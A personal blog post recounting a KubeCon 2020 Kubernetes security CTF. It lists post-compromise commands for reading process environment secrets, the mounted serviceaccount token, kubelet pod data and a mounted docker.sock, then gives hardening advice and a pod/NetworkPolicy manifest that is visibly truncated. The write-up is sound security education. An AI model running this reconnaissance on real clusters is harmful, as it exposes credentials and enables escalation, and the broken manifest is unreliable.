Two weeks ago I did my first Capture The Flag (CTF) during the first time I (e-)attend a KubeCon conference.

Doing this remotely is definitely not the same feeling as I would have experienced in an in-person event. Nonetheless my KubeCon experience was awesome, I learned a lot and I really loved the energy and the momentum from the entire communities (organizers, speakers, sponsors, attendees, etc.). I felt that the focus around Kubernetes is more about how to simplify the developers versus operators experience (`buildpacks`, `kustomize`, `gitops`, `tye`, `cdk`, etc.) and to democratize security (`opa`/`gatekeeper`, `falco`, `eBPF`, etc.) around Kubernetes. If you are interested in reading great summaries from this event, I found very insightful the following resources:

As I have been educating myself more and more about security, especially around Kubernetes, during KubeCon I mostly focused my time on sessions related to Security. Here are 2 announcements I'm really excited about:
- [Announcing the Cloud Native Security White Paper](https://www.cncf.io/blog/2020/11/18/announcing-the-cloud-native-security-white-paper/)
- [Kubernetes Security Specialist Certification Now Available](https://www.cncf.io/announcements/2020/11/17/kubernetes-security-specialist-certification-now-available/)

On Nov 20th, the last day of KubeCon NA 2020, the [SIG-Honk AMA panel: Hacking and Hardening in the Cloud Native Garden](https://kccncna20.sched.com/event/eoIZ) was really informative. This group of friends and longtime Kubernetes security SMEs brought their unique perspectives and experience with securing, attacking, and deploying cloud native infrastructure to form ”sig-HONK,” an unofficial Special Interest Group focused on changing the way we think about and practice security in distributed systems. Related topics:
- [Ian Coldwater won the Top CNCF Ambassador award](https://www.cncf.io/announcements/2020/11/20/cloud-native-computing-foundation-announces-2020-community-awards-winners/), well deserved!
- [Having Cloud Native fun with HonkCTL](https://kccncna20.sched.com/event/ekBS) - [Challenges here](https://github.com/honk-ci/honkctl)

On Nov 17th I e-attended one of the co-located (i.e. extra pre-day) events: the [Cloud Native Security Day](https://events.linuxfoundation.org/cloud-native-security-day-north-america/program/schedule/). An entire day of sessions dedicated to Security with Kubernetes, amazing! But what was even more amazing is something I discovered the same day that a Capture The Flag (CTF) was happening throughout the day!  What!? Yep! For people like me who are eager to learn by having hands-on experience, what a good fit!

> In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment. In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.

[The organizers of this CTF](https://control-plane.io/posts/hands-on-k8s-security/) did a great job and were very responsive on Slack to provide guidance and supports (yes, I needed a lot of tips, but that's ok, I went out of my comfort zone, that was the intent). All the experience started here: https://controlplaneio.github.io/kubecon-2020-sig-security-day-ctf/. From there, we went through 6 scenarios, ~1h each. With each scenario we act as an attacker already in a breached container, and from there we needed to find associated flags.

I won't go all the scenario one-by-one but instead will summarize commands an attacker will run: `id; uname -a; cat /etc/lsb-release /etc/redhat-release /etc/os-release; ps faux; df; mount; curl --version; wget --version`. From there they could see what they could do:
- which distrib is running?
- am I root?
- is there any process I could look at, like a database or anyting else sensitive `cat /proc/$PID/environ`?
- are `curl` or `wget` already installed?
- am I on a container? on kubernetes? is it a recent version of Kubernetes `curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version`?
- is the serviceaccount mounted? what is `ls /var/run/secrets/kubernetes.io/serviceaccount/` telling me? Which actions can I do `kubectl auth can-i --list`, `kubectl auth can-i create pods`?
- is the `docker.sock` mounted? can I leverage few `docker` commands to get more sensitive information or even move laterally?
- do I already know the `INTERNAL-IP` of a Node? If yes, what `curl http://NODE-IP:10255/pods | jq .` is giving me?

More advanced scenario attackers will try, could be:
- Install `amicontained` to find out what container runtime is being used as well as features available: `cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained`
- Install `Docker` if `docker.sock` is mounted to get control on the host: `curl -fsSL https://get.docker.com -o get-docker.sh; docker ps; docker inspect; docker exec...`
- Install `kubectl` to interact with the API server: `export PATH=/tmp:$PATH; cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.4/bin/linux/amd64/kubectl; chmod 555 kubectl`

You could now play around on your own with these above commands with an `ubuntu` container on a given Kubernetes cluster:
```
kubectl run test -i --tty --rm --image ubuntu
```

So let's now talk about how to prevent and avoid such exploits, here are few tips we could leverage for our own security posture with our own containers running on Kubernetes:
- don't let any `curl` or `wget` components in your container if possible to prevent an attacker downloading files
- don't use privileged pod to prevent running as root and avoiding attacker installing tools in there
- don't mount the serviceaccount in your pod if you don't need it
- setup networking policies to restrict to the least minimum ingress and egress rules for your pods
- setup proper resources limits on your deployments could prevent more activities with unusual `cpu` and `memory` usage

Now you could deploy the same `ubuntu` container but with more security features, illustrated below, and from there, you could try again the above commands from an attacker perspective (tl,dr their live will be more complicated ;)):
```
kubectl apply -f - <<EOF
apiVersion: apps/v1

            readOnlyRootFilesystem: true
          image: ubuntu
          command:
            - "sleep"
            - "604800"
          ports:
            - containerPort: 8080
          resources:
            requests:
              cpu: 100m
              memory: 64Mi
            limits:
              cpu: 200m
              memory: 128Mi

kind: NetworkPolicy
metadata:
  name: denyall
spec:
  podSelector: {}
  policyTypes:

  - Egress
EOF
kubectl exec -it ubuntu-xxx -- bash
```

On my end, that's kind of setup and security posture I have been taking, here are more examples I have documented about this:
- [NetworkPolicies with Calico]({{< ref "/posts/2019/09/calico.md" >}})
- [PodSecurityContext]({{< ref "/posts/2020/04/pod-security-context.md" >}})
- [Container linter for compliances and security checks]({{< ref "/posts/2021/01/container-linter.md" >}})
- [Vertical Pod Autoscaler to properly set resources limits and requests]({{< ref "/posts/2021/01/vpa.md" >}})
- [OPA Gatekeeper with Policy Controller]({{< ref "/posts/2021/03/policy-controller.md" >}})

Complementary to this, here are other security features I'm leveraging with my Kubernetes cluster to add extra security layers:
- [Binary Authorization to sign your containers]({{< ref "/posts/2020/11/binauthz.md" >}})
- [Least privilege principle and Workload Identity with my GKE cluster]({{< ref "/posts/2020/10/gke-service-account.md" >}})
- [Containers scanning in registry](https://cloud.google.com/container-analysis/docs/vulnerability-scanning)
- [Minimal and optimized OS for my nodes with COS](https://cloud.google.com/container-optimized-os/) with [`containerd`](https://cloud.google.com/kubernetes-engine/docs/concepts/using-containerd) and auto-upgrade
- Use [Confidential Computing and Shielded Nodes]({{< ref "/posts/2020/10/confidential-computing.md" >}})
- Use [Private Cluster](https://cloud.google.com/kubernetes-engine/docs/concepts/private-cluster-concept)

Security is a shared responsibility: your code, your containers and your Kubernetes clusters are not secured by default, let's democratize security since day 0 at the different levels and layers of your IT solutions!

Hope you enjoyed that one, stay safe, happy sailing and happy honking! ;)

Cheers!
